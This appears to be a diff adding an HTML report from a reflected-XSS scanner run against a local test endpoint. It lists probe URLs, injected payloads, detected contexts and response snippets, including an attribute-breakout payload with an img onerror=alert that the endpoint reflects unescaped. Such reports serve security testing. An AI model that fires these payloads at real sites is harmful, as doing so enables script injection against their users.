@@ -1,0 +1,51 @@
+
+    <html><head><meta charset="utf-8"><title>XSS report</title></head><body>
+    <h2>Reflected XSS Report</h2>
+    <table border=1 cellpadding=6 cellspacing=0>
+      <thead><tr><th>URL</th><th>Param</th><th>Payload</th><th>Context</th><th>Snippet</th></tr></thead>
+      <tbody>
+        
+        <tr>
+          <td>http://127.0.0.1:5000/reflect_attr_name?PAY_piplg1=1</td>
+          <td>PAY_piplg1</td>
+          <td>PAY_piplg1</td>
+          <td>text-node</td>
+          <td><pre>Attribute-name reflectionsReflected attribute-name: PAY_piplg1=1</pre></td>
+        </tr>
+        
+        <tr>
+          <td>http://127.0.0.1:5000/reflect_attr_name?dummy=%22%3EPAY_5iudi7%3C</td>
+          <td>dummy</td>
+          <td>&quot;&gt;PAY_5iudi7&lt;</td>
+          <td>text-node</td>
+          <td><pre>Attribute-name reflectionsPAY_5iudi7&lt;&quot;&gt;Reflected attribute-name: dummy=&quot;&gt;PAY_5iudi7&lt;</pre></td>
+        </tr>
+        
+        <tr>
+          <td>http://127.0.0.1:5000/reflect_attr_name?dummy=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%22PAY_5iudi7%22%29%3E</td>
+          <td>dummy</td>
+          <td>&quot;&gt;&lt;img src=x onerror=alert(&quot;PAY_5iudi7&quot;)&gt;</td>
+          <td>unknown</td>
+          <td><pre>&lt;h3&gt;Attribute-name reflections&lt;/h3&gt;&lt;div dummy=&quot;&quot;&gt;&lt;img src=x onerror=alert(&quot;PAY_5iudi7&quot;)&gt;&quot;&gt;Reflected attribute-name: dummy=&quot;&gt;&lt;img src=x onerror=alert(&quot;PAY_5iudi7&quot;)&gt;&lt;/div&gt;</pre></td>
+        </tr>
+        
+        <tr>
+          <td>http://127.0.0.1:5000/reflect_attr_name?dummy=%3Cscript%3E%2F%2APAY_bfipxl%2A%2F%3C%2Fscript%3E</td>
+          <td>dummy</td>
+          <td>&lt;script&gt;/*PAY_bfipxl*/&lt;/script&gt;</td>
+          <td>attribute-value</td>
+          <td><pre>&lt;div dummy=&quot;&amp;lt;script&amp;gt;/*PAY_bfipxl*/&amp;lt;/script&amp;gt;&quot;&gt;Reflected attribute-name: dummy=&lt;script&gt;/*PAY_bfipxl*/&lt;/script&gt;&lt;/div&gt;</pre></td>
+        </tr>
+        
+        <tr>
+          <td>http://127.0.0.1:5000/reflect_attr_name?dummy=PAY_bfipxl</td>
+          <td>dummy</td>
+          <td>PAY_bfipxl</td>
+          <td>attribute-value</td>
+          <td><pre>&lt;div dummy=&quot;PAY_bfipxl&quot;&gt;Reflected attribute-name: dummy=PAY_bfipxl&lt;/div&gt;</pre></td>
+        </tr>
+        
+      </tbody>
+    </table>
+    </body></html>
+    
